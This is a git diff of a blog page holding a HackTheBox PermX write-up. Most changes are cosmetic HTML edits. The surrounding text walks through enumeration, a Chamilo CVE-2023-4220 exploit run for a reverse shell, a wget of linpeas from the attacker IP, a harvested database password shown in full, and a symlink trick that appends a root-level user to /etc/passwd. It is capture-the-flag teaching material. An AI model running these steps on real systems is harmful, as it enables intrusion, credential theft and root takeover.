@@ -68,21 +68,25 @@
     </script>
 
 
-<meta name="generator" content="Hugo 0.123.7">
+<meta name="generator" content="Hugo 0.144.0">
 
     
-    <meta property="og:title" content="PermX - HackTheBox Write-Up" />
-<meta property="og:description" content="A write-up on the machine PermX." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/permx-hackthebox/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-09-28T00:00:00+00:00" />
-<meta property="article:modified_time" content="2024-09-28T00:00:00+00:00" />
-
+    <meta property="og:url" content="http://localhost:1313/posts/permx-hackthebox/">
+  <meta property="og:site_name" content="PrintN">
+  <meta property="og:title" content="PermX - HackTheBox Write-Up">
+  <meta property="og:description" content="A write-up on the machine PermX.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-28T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-09-28T00:00:00+00:00">
 
 
     
-    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="PermX - HackTheBox Write-Up"/>
-<meta name="twitter:description" content="A write-up on the machine PermX."/>
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="PermX - HackTheBox Write-Up">
+  <meta name="twitter:description" content="A write-up on the machine PermX.">
 
 
     
@@ -210,7 +214,7 @@ stroke-linejoin="round" class="feather feather-home">
 </nav>
     </details>
             <div class="page-content">
-                <p><img alt="Image 0" src="/posts/permx-hackthebox/0.webp"></p>
+                <p><img src="/posts/permx-hackthebox/0.webp" alt="Image 0"></p>
 <h2 id="introduction">Introduction</h2>
 <p>Hello👋 Today we&rsquo;re going to take a look at <a
 
@@ -238,17 +242,17 @@ stroke-linejoin="round" class="feather feather-home">
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff636f">[</span>YOUR_TARGET_IP<span style="color:#ff636f">]</span> permx.htb
 </span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
 <p>We&rsquo;ll start by scanning for open ports with Nmap.
-<img alt="Screenshot 1" src="/posts/permx-hackthebox/1.webp"></p>
+<img src="/posts/permx-hackthebox/1.webp" alt="Screenshot 1"></p>
 <p>We get port 80 and 22, which means there is a website running. There is nothing much of interest on the homepage.
-<img alt="Screenshot 2" src="/posts/permx-hackthebox/2.webp"></p>
+<img src="/posts/permx-hackthebox/2.webp" alt="Screenshot 2"></p>
 <p>So let&rsquo;s try to see if there are any interesting directories, we&rsquo;ll use Gobuster for that.</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://permx.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
-</span></span></code></pre></div><p><img alt="Screenshot 3" src="/posts/permx-hackthebox/3.webp"></p>
+</span></span></code></pre></div><p><img src="/posts/permx-hackthebox/3.webp" alt="Screenshot 3"></p>
 <p>Hmmm. Let&rsquo;s try to find some subdomains with ffuf.</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://permx.htb -H <span style="color:#a6be9d">&#34;Host:FUZZ.permx.htb&#34;</span> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fw <span style="color:#a6be9d">18</span>
-</span></span></code></pre></div><p><img alt="Screenshot 4" src="/posts/permx-hackthebox/4.webp"></p>
+</span></span></code></pre></div><p><img src="/posts/permx-hackthebox/4.webp" alt="Screenshot 4"></p>
 <p>And we got something. Let&rsquo;s try checking <code>lms.permx.htb</code> out. Remember to first add it to our <code>/etc/hosts</code>.
-<img alt="Screenshot 5" src="/posts/permx-hackthebox/5.webp"></p>
+<img src="/posts/permx-hackthebox/5.webp" alt="Screenshot 5"></p>
 <h2 id="getting-access">Getting Access</h2>
 <p>We now know that the website uses Chamilo. Let&rsquo;s try do a quick search on any exploits on Chamilo. And we find <strong>CVE-2023-4220</strong> and a exploit script:</p>
 <p><a
@@ -278,8 +282,8 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>pip install -r requirements.txt
 </span></span></code></pre></div><p>Set up a listener with <code>nc -lvnp 443</code> and then we can run the main.py.</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 main.py -u http://lms.permx.htb -a revshell
-</span></span></code></pre></div><p><img alt="Screenshot 6" src="/posts/permx-hackthebox/6.webp">
-<img alt="Screenshot 7" src="/posts/permx-hackthebox/7.webp"></p>
+</span></span></code></pre></div><p><img src="/posts/permx-hackthebox/6.webp" alt="Screenshot 6">
+<img src="/posts/permx-hackthebox/7.webp" alt="Screenshot 7"></p>
 <p>And we get a shell! Now we want to run <a
 
 	
@@ -305,17 +309,17 @@ stroke-linejoin="round" class="feather feather-home">
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -m http.server
 </span></span></code></pre></div><p>In our shell we run.</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://10.10.14.34:8000/linpeas.sh
-</span></span></code></pre></div><p><img alt="Screenshot 8" src="/posts/permx-hackthebox/8.webp">
-<img alt="Screenshot 9" src="/posts/permx-hackthebox/9.webp"></p>
+</span></span></code></pre></div><p><img src="/posts/permx-hackthebox/8.webp" alt="Screenshot 8">
+<img src="/posts/permx-hackthebox/9.webp" alt="Screenshot 9"></p>
 <p>We get a password from the configuration.php. Now we only need the username to be able to ssh. Which we see is <code>mtz</code> by going to the home directory.</p>
-<p><img alt="Screenshot 10" src="/posts/permx-hackthebox/10.webp"></p>
+<p><img src="/posts/permx-hackthebox/10.webp" alt="Screenshot 10"></p>
 <p>Let&rsquo;s ssh into <code>mtz</code> with the password <code>03F6lY3uXAP2bkW8</code>
-<img alt="Screenshot 11" src="/posts/permx-hackthebox/11.webp"></p>
+<img src="/posts/permx-hackthebox/11.webp" alt="Screenshot 11"></p>
 <p>And we get our first flag!</p>
-<p><img alt="Screenshot 12" src="/posts/permx-hackthebox/12.webp"></p>
+<p><img src="/posts/permx-hackthebox/12.webp" alt="Screenshot 12"></p>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>We start by running <code>sudo -l</code> and we se that we can run <code>/opt/acl.sh</code> as root.
-<img alt="Screenshot 13" src="/posts/permx-hackthebox/13.webp">
+<img src="/posts/permx-hackthebox/13.webp" alt="Screenshot 13">
 Let&rsquo;s take a look at <code>/opt/acl.sh</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#!/bin/bash
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
@@ -343,7 +347,7 @@ Let&rsquo;s take a look at <code>/opt/acl.sh</code>.</p>
 </span></span></code></pre></div><p>This script lets the user <code>mtz</code> change file permissions for any user, but only for files in the <code>/home/mtz</code> directory. It also blocks us from using path traversal.</p>
 <p>What we can do is make a symlink to the <code>/etc/passwd</code> inside the <code>/home/mtz</code> and then add a privileged user.</p>
 <p>So we first have to generate a password hash.</p>
-<p><img alt="Screenshot 14" src="/posts/permx-hackthebox/14.webp"></p>
+<p><img src="/posts/permx-hackthebox/14.webp" alt="Screenshot 14"></p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir /tmp
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">cd</span> /tmp
 </span></span><span style="display:flex;"><span>ln -s /etc/passwd passwd
@@ -351,7 +355,7 @@ Let&rsquo;s take a look at <code>/opt/acl.sh</code>.</p>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#39;printn:$1$IeeL.gZ3$gs5hdreEStMsIs6wN.lVn0:0:0:root:/root:/bin/bash&#39;</span> &gt;&gt; /home/mtz/tmp/passwd
 </span></span></code></pre></div><p>After running the commands above our user should now be added to the <code>/etc/passwd</code>. Now we can just <code>su printn</code> with the password <code>printn</code>.</p>
 <p>And we get root. We can now get the last flag 🥳</p>
-<p><img alt="Screenshot 15" src="/posts/permx-hackthebox/15.webp"></p>
+<p><img src="/posts/permx-hackthebox/15.webp" alt="Screenshot 15"></p>
 
             </div>
         </article></main>
